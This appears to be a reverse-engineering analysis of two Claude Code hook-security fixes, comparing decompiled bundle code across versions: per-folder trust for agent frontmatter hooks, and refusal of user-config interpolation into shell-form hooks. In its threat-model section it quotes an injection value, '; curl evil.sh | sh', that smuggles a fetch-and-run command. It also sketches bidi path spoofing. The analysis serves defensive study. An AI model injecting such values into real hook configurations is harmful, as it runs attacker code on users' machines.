# Hook trust and origin: who is allowed to make a hook run (`.207`, `.218`)

**Target bundle:** `/lyz/codespace/claude-code-bomb/versions/2.1.220/extract/cli_inner_pretty.js`
(872,596 lines). Baseline `/lyz/codespace/claude-code-bomb/versions/2.1.193/extract/cli_inner_pretty.js`,
always tagged `(193)`.

A hook is an arbitrary program that Claude Code spawns **unsandboxed** — `q2o` (`:519921`) calls
`child_process.spawn` with a constructed env and the session cwd (`:520013-520028`), and the shipped
`DirectoryAdded` documentation says so out loud (`:696699`: *"hook commands themselves run
unsandboxed"*). Everything protecting the user therefore lives at *configuration* time: which
declarations are allowed to become a hook, and what may be interpolated into one.

This window moved that boundary twice:

| Release | Change | Verdict |
|---|---|---|
| `.218` | agent-frontmatter hooks require **the agent file's own folder** to have accepted workspace trust | NET_NEW — `tengu_agent_hooks_origin_untrusted` 220=1 / 193=0 |
| `.207` | plugin hooks may no longer interpolate `${user_config.*}` into a **shell-form** command | NET_NEW — `plugin hook references ${user_config.*} in shell-form command` 220=1 / 193=0 |

Both are the same move: **a value that used to be silently accepted is now refused, with a remediation
in the message.** Neither adds a setting; both make an existing capability narrower.

---

## 0. The five gates, and which one each bullet moved

Before either bullet, a hook already had to clear four gates. Naming them makes the `.218` delta easy
to place, because it is a *fifth* gate at a level none of the others covered.

| # | Gate | Where | Scope | 220 / 193 |
|---|---|---|---|---|
| 1 | `disableAllHooks` / `fd("hooks")` kill switch | `:520320`, `:520323`, `:319522` | process | carryover |
| 2 | **session workspace trust** — `GYe()` | `:519618`; used at `:520590`, `:521559`, `:521840`, `:521880`, `:750195`, `:764200` | the session cwd, one bit | **7 / 7 — pure carryover** |
| 3 | `strictPluginOnlyCustomization` — `YC(kind)` | `:214479` | per customization kind | carryover |
| 4 | `allowManagedHooksOnly` / safe-mode plugin filter | `:520325-520336` | per hook source | carryover |
| 5 | **origin trust for frontmatter hooks** — `MTo(agent)` | `:342023` | the *folder each agent file came from* | **NEW in `.218`** |

Gate 2 is the one people assume covers gate 5, and the count proves it does not move:
`workspace trust not accepted` is **220=7 / 193=7**, with a one-to-one site correspondence
(`:520591`↔`:589982 (193)`, `:521559`↔`:590854 (193)`, `:521840`↔`:591111 (193)`,
`:521880`↔`:591146 (193)`, `:736138`↔`:619312 (193)`, `:750195`↔`:632135 (193)`,
`:764201`↔`:642795 (193)`). **Do not cite gate 2 as the `.218` fix.**

Gate 2's own logic, for reference (all carryover):

```javascript
function GYe() { return !Txe(); }                       // :519618  shouldSkipHookDueToTrust
function Txe() { if (yn()) return !0; return Jd(); }    // :535955  isProjectScopeTrustAccepted
function yn()  { return !Ot.isInteractive; }            // :3286    non-interactive ⇒ trusted
```

Note the first line of `Txe`: **a non-interactive session is treated as trusted**, because there is
nobody to show a trust dialog to and the caller (CI, SDK harness) is presumed to have vetted the
workspace. That is exactly why gate 5 had to be added at a different level — in a headless run, gate 2
is a no-op.

---

## 1. `.218` — agent frontmatter hooks and the folder they came from

> *"Fixed agent frontmatter hooks running from untrusted folders: hooks now require the agent file's own
> folder to have accepted workspace trust"*

**Verdict: NET_NEW.** New literals: `Skipping frontmatter hooks for` (220=1 / 193=0),
`the folder its definition file came from is not trusted` (220=1 / 193=0), and the gate
`tengu_agent_hooks_origin_untrusted` (220=1 / 193=0, `:342054`).

### The hole

An agent is a markdown file with YAML frontmatter, and that frontmatter may declare `hooks:`. When an
agent is selected — as a subagent or as the main-thread agent — its frontmatter hooks are copied into
the session's hook registry and then run like any other hook.

Agent files are discovered from several roots. The ones that matter are the **additional working
directories** (`--add-dir`, the SDK `additionalDirectories`, and now `register_repo_root`): an agent
file can live in a directory that was attached to the session but whose *project* the user never
opened, never saw a trust dialog for, and never accepted. `fromAdditionalDirectory` is a pre-existing
field on the agent descriptor (220=5 / 193=4 — the fifth site is the new telemetry) and `baseDir`
likewise (220=44 / 193=42), so the *information* needed to catch this was already on the record; nobody
was reading it.

2.1.193's registration guard, both surfaces:

```javascript
// 2.1.193, subagent spawn, :398688
let ze = !EE("hooks") || oye(e.source);
if (e.hooks && ze) VKa(n.sessionHooksRegistry, K, e.hooks, `agent '${e.agentType}'`, !0);

// 2.1.193, main-thread agent, :641513-641514
if (e?.hooks && (!EE("hooks") || oye(e.source))) _tn(e.hooks);
else _tn(void 0);
```

`EE`/`oye` are gate 3 (`strictPluginOnlyCustomization` and the always-trusted-source set). There is no
path check of any kind. An agent file under an added directory therefore registered hooks that spawned
unsandboxed processes on the next matching event.

### The gate

```javascript
// ============================================
// isAgentHookOriginTrusted - .218's per-origin trust gate for frontmatter hooks
// Location: cli_inner_pretty.js:342023-342045
// ============================================

// ORIGINAL (for source lookup):
function MTo(e) {
  if (vke(e.source)) return !0;
  if (e.source === "userSettings" || e.source === "flagSettings") return !0;
  if (!e.baseDir) return vB();
  return Dpr(vdd(e.baseDir));
}
function U$y(e) {
  if (!e.baseDir) return;
  return jon(vdd(e.baseDir));
}
function vdd(e) {
  let t = Lpr.dirname(e);
  if (Lpr.basename(e) === "agents" && Lpr.basename(t) === ".claude") return Lpr.dirname(t);
  return e;
}
function OTo(e, t) {
  let r = U$y(e) ?? wW(),
    n = t === "mainThread" ? "main-thread agent" : "agent",
    o = m_(e.agentType);
  (w(
    `Skipping frontmatter hooks for ${n} '${o}': the folder its definition file came from is not trusted (source: ${e.source}, trust key: ${Edd(r)}). Run Claude Code there once and accept the trust dialog, or set projects[${Edd(r)}].hasTrustDialogAccepted: true in ${cv()}.`,
    { level: "error" },
  ),
    O("tengu_agent_hooks_origin_untrusted", {
      source: fe(e.source),
      surface: fe(t),
      fromAdditionalDirectory: fe(e.fromAdditionalDirectory === !0 ? "true" : "false"),
    }));
}

// READABLE (for understanding):
function isAgentHookOriginTrusted(agent) {
  if (isAlwaysTrustedSource(agent.source)) return true;        // plugin | policySettings | built-in | builtin | bundled
  if (agent.source === "userSettings" || agent.source === "flagSettings") return true;
  if (!agent.baseDir) return isWorkspacePersistedTrusted();    // no origin on record -> fall back to the session cwd
  return isPathPersistedTrusted(agentTrustRoot(agent.baseDir));
}

function agentHookTrustKey(agent) {
  if (!agent.baseDir) return undefined;
  return getPersistedTrustKeyForPath(agentTrustRoot(agent.baseDir));
}

function agentTrustRoot(baseDir) {
  let parent = path.dirname(baseDir);
  //  <project>/.claude/agents  ->  <project>
  if (path.basename(baseDir) === "agents" && path.basename(parent) === ".claude") return path.dirname(parent);
  return baseDir;
}

function logAgentHooksOriginUntrusted(agent, surface) {
  let trustKey = agentHookTrustKey(agent) ?? getWorkspacePersistedTrustKey(),
    label = surface === "mainThread" ? "main-thread agent" : "agent",
    agentName = scrubControlChars(agent.agentType);
  logForDebugging(
    `Skipping frontmatter hooks for ${label} '${agentName}': the folder its definition file came from is not ` +
    `trusted (source: ${agent.source}, trust key: ${escapeInvisibles(trustKey)}). Run Claude Code there once and ` +
    `accept the trust dialog, or set projects[${escapeInvisibles(trustKey)}].hasTrustDialogAccepted: true in ` +
    `${globalConfigPath()}.`,
    { level: "error" });
  emitTelemetry("tengu_agent_hooks_origin_untrusted", {
    source: sanitizeEnum(agent.source),
    surface: sanitizeEnum(surface),                                        // "subagent" | "mainThread"
    fromAdditionalDirectory: sanitizeEnum(String(agent.fromAdditionalDirectory === true)),
  });
}

// Mapping: MTo→isAgentHookOriginTrusted, U$y→agentHookTrustKey, vdd→agentTrustRoot,
//          OTo→logAgentHooksOriginUntrusted, Edd→escapeInvisibles (:342039), vke→isAlwaysTrustedSource (:214485),
//          vB→isWorkspacePersistedTrusted (:535958), Dpr→isPathPersistedTrusted (:535961),
//          jon→getPersistedTrustKeyForPath (:535968), wW→getWorkspacePersistedTrustKey (:535965),
//          m_→scrubControlChars (:217537), cv→globalConfigPath (:30751)
```

### How the four branches are ordered, and why

`MTo` is four early returns and the order encodes a whole trust model.

1. **`vke(e.source)`** (`:214485-214487`) — `gzg = new Set(["plugin", "policySettings", "built-in",
   "builtin", "bundled"])` (`:214491`). These sources have already cleared their *own* install-consent
   or admin-authored gate; re-checking a filesystem path for a built-in agent would be nonsense (it has
   no folder) and for a plugin would double-charge a decision the user already made at
   `/plugin install`. First, because it is the cheapest and the most categorical.
2. **`userSettings` / `flagSettings`** — `~/.claude/agents/**` and agents named on the command line.
   The user's home configuration is the user, and a `--agents`-style flag is a live typed instruction.
   Note what is *absent*: `projectSettings` and `localSettings`. Those live in the repository and are
   exactly the untrusted-input case, so they fall through to the path check. This is the same
   trust-source split `.207` made for `autoMode` (`:63551-63564`) and for `pluginConfigs`
   (`a5g = ["userSettings","flagSettings","policySettings"]`, `:191083`).
3. **`!e.baseDir` → `vB()`** — a descriptor with no recorded origin falls back to the **session**
   workspace-trust bit (`isWorkspacePersistedTrusted`, `:535958`). Fail-closed relative to branch 4
   (something with no origin cannot be more trusted than the session), fail-open relative to refusing
   outright (a synthesised or in-memory agent would otherwise be permanently hook-less).
4. **`Dpr(vdd(e.baseDir))`** — the real check.

### The trust key: a *repo* root, not a directory

```javascript
function Dpr(e) { let t = jon(e); return xt().projects?.[t]?.hasTrustDialogAccepted === !0; }  // :535961
function jon(e) { return qOe(gu(e) ?? v_.resolve(e)); }                                         // :535968
```

`gu` = `findCanonicalGitRoot` (`:55486`), `qOe` = path-separator normaliser (`:51883`). So the key is
**the canonical git root containing the agent's folder**, or the resolved absolute path when the folder
is not in a repo — the same key `~/.claude.json`'s `projects` map is indexed by. That makes the new
check consistent with the trust dialog the user actually saw: accepting trust for a repo covers every
agent file anywhere in it, and does not have to be repeated per subdirectory.

`vdd` (`agentTrustRoot`, `:342033-342037`) normalises **before** the key is computed: if `baseDir` ends
in `.claude/agents` it climbs two levels to the project directory. This matters when the agent folder is
not inside a git repo — without it, the key for a non-repo project would be
`/path/to/project/.claude/agents` while the trust dialog recorded `/path/to/project`, and the check
would fail for every agent even in a workspace the user explicitly trusted. The two-part basename test
(`basename === "agents" && basename(dirname) === ".claude"`) is deliberately narrow so a user directory
that merely happens to be called `agents` is not silently reinterpreted.

### The refusal message is the interesting artefact

It is `level: "error"` (not `warn`), it names the surface, the source, and the exact trust key, and it
gives **two** remediations: run Claude Code in that folder once and accept the dialog, or hand-edit
`projects[<key>].hasTrustDialogAccepted` in `~/.claude.json` (path from `cv()`, `:30751`). Printing the
key is what makes the second remediation usable — the key is a *canonicalised git root*, which is often
not the path the user would have guessed.

And the key is passed through `Edd` (`:342039-342045`) before printing:

```javascript
function Edd(e) {
  return Ie(e).replace(/[-  \p{Cf}]/gu, (t) =>
    t.split("").map((r) => "\\u" + r.charCodeAt(0).toString(16).padStart(4, "0")).join(""));
}
```

— JSON-stringify, then escape C1 controls, line/paragraph separators, and the whole `\p{Cf}` format
category (which includes the bidi overrides `U+202A`–`U+202E` and `U+2066`–`U+2069`). The agent's own
name gets `m_` (`:217537`), which collapses `\p{Cc}\p{Cf}` runs to a space. **A path and an agent name
that reach this message are attacker-controlled strings from an untrusted repository**, and this
message is the one place where they are shown to a user who is being asked to make a trust decision —
so a Trojan-Source-style bidi trick that made a hostile path render as a familiar one is exactly the
attack to block. That the *security-refusal message* is the sanitised one is a good sign about how this
fix was designed.

### The two call sites

```javascript
// 2.1.220, subagent spawn, :344415-344418
let Pt = !YC("hooks") || vke(e.source);
if ($To(e.hooks) && Pt)
  if (MTo(e)) Add(r.sessionHooksRegistry, oe, e.hooks, `agent '${e.agentType}'`, !0);
  else OTo(e, "subagent");

// 2.1.220, main-thread agent, :762226-762239
function owt(e) {
  if (!e || !$To(e.hooks)) { hNr(void 0); return; }
  let t = !YC("hooks") || vke(e.source),
    r = MTo(e);
  if (t && r) { hNr(e.hooks); return; }
  if (t && !r) OTo(e, "mainThread");
  hNr(void 0);
}
```

Both preserve gate 3 exactly (`Pt` / `t` are 193's `ze`), and both add `MTo` as an **AND**, never an OR.
The `if (t && !r)` in `owt` is a small correctness detail: telemetry fires only when the *origin* is the
reason for the skip. If gate 3 already blocked the agent, emitting
`tengu_agent_hooks_origin_untrusted` would misattribute the cause, and this gate is presumably being
watched for rollout impact.

The registration function `Add` (`:342080-342097`) is **byte-identical** to 193's `VKa`
(`:382414-382431 (193)`), down to the `Converting Stop hook to SubagentStop` log line (220=1 / 193=1)
and the `Registered N frontmatter hook(s) from …` line (220=1 / 193=1). So this is purely a new guard in
front of unchanged machinery — the cleanest possible shape for a security fix.

### The second, undocumented half: `$To`

193 tested `e.hooks` (truthiness). 220 tests `$To(e.hooks)` (`:342071-342078`):

```javascript
function $To(e) {
  if (!e || Object.keys(e).length === 0) return !1;
  for (let t of lB) {                                // the 31-name hook-event enum, :49367
    let r = e[t];
    if (!r || r.length === 0) continue;
    for (let n of r) if ((n.hooks?.length ?? 0) > 0) return !0;
  }
  return !1;
}
```

A **deep** emptiness test: an agent whose frontmatter declares `hooks: { PreToolUse: [] }` — or an event
key that is not in `lB` at all — now counts as having no hooks. Without it, such an agent would take the
`MTo` branch and, if its origin were untrusted, produce a scary `level: "error"` refusal for a hook set
that was empty. So `$To` exists to keep the *false-positive rate of the new warning* at zero. That it
iterates `lB` rather than `Object.keys` is the same containment decision as `Add`'s loop: an unknown
event name is not merely ignored at registration, it does not even count as a hook for the purposes of
this check.

### What this does not cover

`MTo` guards **agent frontmatter** hooks only. Skill frontmatter hooks (`skillRoot`, `:215745`; also `:215755`, `:215781`) and
`settings.json` hooks reach the registry by other paths and are governed by gates 1–4. There is no
per-origin trust check for those in 2.1.220 — a fact worth stating because the natural reading of the
changelog bullet is broader than the code.

---

## 2. `.207` — `${user_config.*}` may no longer be interpolated into a shell-form hook

> *"Plugin hooks/monitors/MCP headersHelper: `${user_config.*}` in shell-form commands is now rejected
> (shell-injection fix). Hooks: use exec form (`args` array) or `$CLAUDE_PLUGIN_OPTION_<KEY>`; monitors
> and headersHelper: read the value inside the script (config file or the server's `env` block)."*

**Verdict: NET_NEW for the hooks refusal.** `plugin hook references ${user_config.*} in shell-form
command` is 220=1 (`:519971`) / 193=0; `would be re-parsed by the shell` 220=1 / 193=0. The bullet spans
three subsystems; only the hooks site is covered here. The monitor site (`:764147`) and the MCP
`headersHelper` site (`:268208`) belong to `skills_plugins` / `39_mcp`.

### What `${user_config.*}` is, and why interpolating it is unsafe

A plugin declares a `userConfig` schema; the user fills it in via `/plugin manage`. The values are
addressable as `${user_config.KEY}` in plugin-authored config. The schema's own description
(`:59400-59406`) states both the substitution surface and the alternative:

> `Option keys must be valid identifiers (letters, digits, underscore; no leading digit) — they become
> CLAUDE_PLUGIN_OPTION_<KEY> env vars in hooks`

The substituting function is `sDt` (`:214407-214416`), and it is a **plain textual replace**:

```javascript
function sDt(e, t) {
  return e.replace(/\$\{user_config\.([^}]+)\}/g, (r, n) => {
    let o = t[n];
    if (o === void 0)
      throw Error(`Plugin option "${n}" isn't set. Open /plugin manage to configure it, …`);
    return String(o);
  });
}
```

No quoting, no escaping. In 2.1.193 the result of that replace was assigned to the hook's **shell
command string**, which is then handed to `child_process.spawn(cmd, [], { shell: true })`
(`:520028`). A plugin option whose value is `; curl evil.sh | sh` therefore became a second command.

The threat model is worth being precise about, because it is *not* "a malicious plugin": a malicious
plugin can simply put the payload in its own `command`. It is:

- a **user-typed value** that happens to contain shell metacharacters (a password with a `$`, a path
  with a space, a Windows path with backslashes) silently changing the command's *structure*;
- a value that arrives from a **non-interactive source** — a settings file, an MCP-provided default, a
  synced managed setting — into a plugin the user did trust;
- a **benign plugin turned into a gadget**: the plugin author writes `mytool --path ${user_config.dir}`
  and never imagines the value is re-parsed.

### The 193 → 220 diff, in one block

```javascript
// ============================================
// spawnHookCommand (plugin-root section) - substitution replaced by refusal
// Location: cli_inner_pretty.js:519961-519974   (193 twin :589407-589422)
// ============================================

// ORIGINAL (for source lookup):
  if (l) {
    if (!(await ey(l)))
      throw Error(`Plugin directory does not exist: ${l}` + (c ? ` (${c} — run /plugin to reinstall)` : ""));
    if (c) I = NW(c);
    if (!A && I) {
      if (lor(C, I))
        throw new Lr(
          `Hook from ${c ? `plugin ${c}` : "a plugin"} references \${user_config.*} in a shell-form command. The substituted value would be re-parsed by the shell. Use exec ` +
            'form instead — {"command": "<executable>", "args": ' +
            '["${user_config.KEY}", ...]} — or read ' +
            `$CLAUDE_PLUGIN_OPTION_<KEY> from the hook's environment. Command: ${rSe(e)}`,
          "plugin hook references ${user_config.*} in shell-form command",
        );
    }
  }

// READABLE (for understanding):
  if (pluginRoot) {
    if (!(await pathExists(pluginRoot)))
      throw Error(`Plugin directory does not exist: ${pluginRoot}` + …);
    if (pluginId) userConfigValues = getPluginUserConfigValues(pluginId);
    if (!isExecForm && userConfigValues) {                       // isExecForm === (hook.args !== undefined)
      if (wouldSubstituteUserConfig(commandString, userConfigValues))
        throw new ControlError(
          `Hook from plugin ${pluginId} references \${user_config.*} in a shell-form command. ` +
          `The substituted value would be re-parsed by the shell. ` +
          `Use exec form instead — {"command": "<executable>", "args": ["\${user_config.KEY}", ...]} — ` +
          `or read $CLAUDE_PLUGIN_OPTION_<KEY> from the hook's environment. Command: ${describeHook(hook)}`,
          /* stable reason */ "plugin hook references ${user_config.*} in shell-form command");
    }
  }

// 2.1.193 for comparison (:589407-589422):
//   if (l) {
//     if (!(await Yu(l))) throw Error(`Plugin directory does not exist: ${l}` + …);
//     if (c) C = DM(c);
//     if (!_) {                                   // !isExecForm
//       if (b) { …${CLAUDE_PLUGIN_ROOT}/${CLAUDE_PROJECT_DIR}/${CLAUDE_PLUGIN_DATA} replaces into v… }
//       if (C) v = ibe(v, C);                     // <-- SUBSTITUTED user_config INTO THE SHELL STRING
//     }
//   }

// Mapping: lor→wouldSubstituteUserConfig (:214417), sDt/ibe→substituteUserConfig (:214407),
//          NW→getPluginUserConfigValues, A/_→isExecForm, C/v→commandString, I/C→userConfigValues,
//          Lr→ControlError, rSe→describeHook (:215859), ey/Yu→pathExists
```

The one substituting statement became a throwing statement. Everything around it is unchanged.

### `lor` — the detector, and its fail-closed `catch`

```javascript
function lor(e, t) {                    // :214417-214423
  try { return sDt(e, t) !== e; }
  catch { return !0; }
}
```

**What it does:** answers "would substitution change this string?" without doing the substitution.

**Why it is written this way rather than as a regex test:** `sDt` throws for an *unset* option
(`Plugin option "X" isn't set…`), so a plain `/\$\{user_config\./.test(cmd)` and a
`sDt(cmd) !== cmd` disagree on exactly one case: a shell-form command referencing an option the user
never configured. `lor` maps that case to **`true` — refuse** via the bare `catch`. That is the correct
direction: an unset option today may be set tomorrow, and the refusal message is a far better outcome
than a "Plugin option isn't set" error that starts working (and injecting) once the user fills in the
field. Two lines, one deliberate fail-closed.

**Why `!== e` rather than "contains the pattern":** it is exact. A `${user_config.KEY}` whose value is
byte-identical to the placeholder text cannot exist in practice, and any string the substituter would
leave alone is by definition not a substitution.

### Why exec form is safe, and why the env var is safer still

Both escape hatches survive and both are carryover mechanisms:

- **Exec form.** When `args` is present, `q2o` builds `R = [ge(e.command), e.args.map(ge)]`
  (`:519976-519987`) and spawns via `G2o.spawn(R[0], R[1], { env, cwd, detached, windowsHide })`
  (`:520014`) — **no `shell: true`**. Each element is substituted independently (`sDt(Oe, I)` at
  `:519982`) and delivered to `execve` as one argv slot. A value containing `;`, `$`, backticks or
  spaces is a literal argument. The `args` field's own schema description already stated this contract
  in 2.1.193 and is byte-identical in 220 (`:58555-58561`):
  > *"Path placeholders like `${CLAUDE_PLUGIN_ROOT}` are substituted per-element as plain strings, so
  > paths with quotes, $, or backticks never reach a shell parser."*
  `.207` did not create exec form; it made exec form **the only** way to pass a plugin option as an
  argument.
- **`$CLAUDE_PLUGIN_OPTION_<KEY>`.** Injected at `:520000-520004`:
  ```javascript
  if ((Object.assign(M, wip(c)), I))
    for (let [Ce, Ne] of Object.entries(I)) {
      let ge = Ce.replace(/[^A-Za-z0-9_]/g, "_").toUpperCase();
      M[`CLAUDE_PLUGIN_OPTION_${ge}`] = String(Ne);
    }
  ```
  This is **pure carryover** — 193 has the identical loop at `:589449-589453`. The literal
  `CLAUDE_PLUGIN_OPTION_` is 220=3 / 193=2, and the extra 220 site is the refusal message itself
  (`:519970`); the schema hint (`:59400` / `:55176 (193)`) and the injection loop are both unchanged.
  Reading `$CLAUDE_PLUGIN_OPTION_KEY` *inside* the script is strictly better than exec form because the
  value never appears in the process's argv (so it is not in `ps` output), which matters for
  `sensitive` options.

**Why the message offers exec form first when the env var is safer?** Because exec form is a
mechanical, local edit to the hook declaration, while the env var requires editing the *script*. The
message is optimising for the migration a plugin author can actually perform.

### Two smaller things in the same diff, stated with their caveats

1. **`Lr` two-argument errors.** The refusal is `new Lr(humanText, stableReason)`. The stable second
   argument is the literal the ledger tracks (`plugin hook references ${user_config.*} in shell-form
   command`). The same class is used by `.219`'s three `register_repo_root` throws
   ([`directory_added_hook.md`](directory_added_hook.md) §4). Detail for the human, stable string for
   telemetry and the wire.
2. **The PowerShell placeholder path moved.** 193 did the `${CLAUDE_PLUGIN_ROOT}` /
   `${CLAUDE_PROJECT_DIR}` / `${CLAUDE_PLUGIN_DATA}` replacement for shell-form hooks inside the
   `if (b /* isPowerShell */)` branch of this same block; 220 does it earlier and differently, via
   `$F_` (`:521987-521991`), which **rewrites `${VAR}` to `${env:VAR}`** rather than substituting a
   value — leaving PowerShell to resolve it from the environment. That is a real structural change in
   the same function, but I have not established that it is part of the `.207` bullet, and its own
   warning string (`PowerShell hook command references $CLAUDE_PROJECT_DIR…`, `:519940`) suggests a
   separate PowerShell-correctness effort. Recorded here so a reader diffing the block is not surprised;
   not claimed as `.207`.

---

## 3. The model these two bullets add up to

Both fixes install a check at the point where an **untrusted string becomes executable authority**, and
both refuse rather than sanitise:

| | `.218` | `.207` |
|---|---|---|
| untrusted input | a file path (which agent definition was loaded) | a config value (what gets interpolated) |
| what it could become | a spawned unsandboxed process | extra shell commands in a spawned process |
| the check | `hasTrustDialogAccepted` on the canonical git root of the file's folder | "would substitution change the string?" |
| response | skip registration, log at `error`, emit a gate | throw with a stable reason |
| escape hatch | accept the trust dialog there once | exec form, or `$CLAUDE_PLUGIN_OPTION_<KEY>` |
| fail direction | closed (no `baseDir` → session trust bit) | closed (`lor`'s bare `catch` → refuse) |

Neither sanitises the dangerous value, and that is the shared design choice. Sanitising a path against
a trust database is not possible; sanitising a string for `sh` is possible but is the classic mistake —
correct quoting depends on the surrounding context (`bash` vs `powershell` vs Git Bash on Windows, all
three of which `q2o` supports at `:520014-520030`), so a quoter would have to be per-shell and would be
wrong somewhere. Refusing and naming the safe alternative is the cheaper correct answer.

The gap both leave open is the same one: **`settings.json`-sourced and skill-frontmatter hooks have no
per-origin trust check**, and a shell-form hook in `settings.json` can still interpolate
`${CLAUDE_PROJECT_DIR}` into a shell string. The 2.1.220 hook system's trust boundary is drawn around
*plugins* and *agent files*, not around hooks in general.

---

## Related Symbols

> Symbol mappings:
> - [symbol_index_core_execution.md](../00_overview/symbol_index_core_execution.md) - Core execution
> - [symbol_index_core_features.md](../00_overview/symbol_index_core_features.md) - Core features
> - [symbol_index_infra_platform.md](../00_overview/symbol_index_infra_platform.md) - Platform infra
> - [symbol_index_infra_integration.md](../00_overview/symbol_index_infra_integration.md) - Integrations
>
> New symbols from this document are staged in
> [symbol_additions_v2_1_220_hooks.md](../00_overview/symbol_additions_v2_1_220_hooks.md).

Key functions in this document:
- `isAgentHookOriginTrusted` (`MTo`, `:342023`) - the `.218` four-branch per-origin gate
- `agentTrustRoot` (`vdd`, `:342033`) - climbs `<project>/.claude/agents` → `<project>`
- `agentHookTrustKey` (`U$y`, `:342029`) - the canonical trust key for an agent's `baseDir`
- `logAgentHooksOriginUntrusted` (`OTo`, `:342046`) - refusal log + `tengu_agent_hooks_origin_untrusted`
- `escapeInvisibles` (`Edd`, `:342039`) - escapes C1 / `\p{Cf}` / line separators in the refusal message
- `hasAnyFrontmatterHooks` (`$To`, `:342071`) - deep emptiness test over the 31-event enum
- `registerFrontmatterHooks` (`Add`, `:342080`) - byte-identical to `VKa` `:382414 (193)`
- `applyMainThreadAgentHooks` (`owt`, `:762226`) - main-thread surface; `OTo(e, "mainThread")` at `:762237`
- `isAlwaysTrustedSource` (`vke`, `:214485`) - `gzg` set `:214491`
- `isStrictPluginOnlyCustomization` (`YC`, `:214479`) - gate 3, carryover
- `shouldSkipHookDueToTrust` (`GYe`, `:519618`) - gate 2, session-wide, **7/7 carryover**
- `isProjectScopeTrustAccepted` (`Txe`, `:535955`) - non-interactive sessions are trusted
- `isWorkspacePersistedTrusted` (`vB`, `:535958`) / `isPathPersistedTrusted` (`Dpr`, `:535961`)
- `getPersistedTrustKeyForPath` (`jon`, `:535968`) - `normalize(findCanonicalGitRoot(p) ?? resolve(p))`
- `findCanonicalGitRoot` (`gu`, `:55486`) / `normalizePathSeparators` (`qOe`, `:51883`)
- `globalConfigPath` (`cv`, `:30751`) - `~/.claude.json` (or `CLAUDE_CONFIG_DIR`)
- `spawnHookCommand` (`q2o`, `:519921`) - env build, exec-vs-shell decision, `child_process.spawn`
- `substituteUserConfig` (`sDt`, `:214407`) - textual `${user_config.KEY}` replace; throws on unset
- `wouldSubstituteUserConfig` (`lor`, `:214417`) - fail-closed detector; bare `catch` returns `true`
- `rewritePlaceholdersForPowerShell` (`$F_`, `:521987`) - `${VAR}` → `${env:VAR}`
